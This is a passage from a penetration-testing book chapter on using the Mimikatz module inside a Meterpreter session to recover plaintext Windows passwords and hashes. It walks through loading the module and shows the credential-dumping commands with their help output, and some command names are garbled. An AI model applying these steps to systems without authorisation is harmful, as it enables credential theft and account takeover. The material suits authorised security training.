    # # Chapter 18 – Mimikatz Plain Text Passwords


    ## Introduction

    In this section we will look at recovering remote passwords in plain text.


    You read that right, *plain text*!


    I''ve communicated with Benjamin Delpy (aka Gentil Kiwi), the mastermind behind
    “Mimikatz”, on a couple occasions and he seems to be one of the nicest guys in
    the security community.


    I am not going to pretend that I understand exactly how he does what, but this
    master programmer has found that Windows passwords in plain text (!) in several
    locations in Windows processes.


    And he has found out, with his programming wizardry, to pull them out.


    Mimikatz has been available as a stand-alone program for a while, and has been
    added into the Metasploit Framework as a loadable Meterpreter module, making recovering
    passwords once you have a remote session incredibly easy.


    And did I mention the passwords are in plain text?


    # ## Loading the Module

    We will start with an active Windows 7 System level remote shell in Meterpreter.


    > (See the Chapter on Bypassing UAC to see how to go from an administrator level
    to system level account).


    ```

    meterpreter > getuid

    Server username: NT AUTHORITY\SYSTEM

    meterpreter >

    ```


    We need to load the mimikatz module, there is a 32 and 64 bit module, choose accordingly.


    ```

    meterpreter > load mimikatz

    load mimikatz      load mimikatz.x64

    meterpreter >

    ```


    +   1. At the Meterpreter prompt, type “load mimikatz”.

    2. Type “help” for a list of available commands.'
  - '[PAGE 153]


    ```

    MimikatzCommands   Description

    Command            ------------------------------------------------------------

    kerberos           Attempt to retrieve kerberos creds

    livespass          Attempt to retrieve livesvsp creds

    imikatz_command    Run a custom command

    msv               Attempt to retrieve msv creds (hashes)

    sssp               Attempt to retrieve ssp creds

    tspkg             Attempt to retrieve tspkg creds

    wdigest            Attempt to retrieve wdigest creds


    meterpreter >

    ```


    The help is pretty self-explanatory; basically type the corresponding command
    for the creds that you want to recover.


    So for Kerberos just type "kerberos" at the Meterpreter prompt. Or type "msv"
    to recover the hashes.


    Using these commands you can recover user passwords from multiple system sources
    - Windows Login passwords, MS Live passwords, terminal server passwords, etc.


    You can also use "mimikatz-command" to perform even more functions like retrieving
    stored credentials. But for now we are interested in passwords.


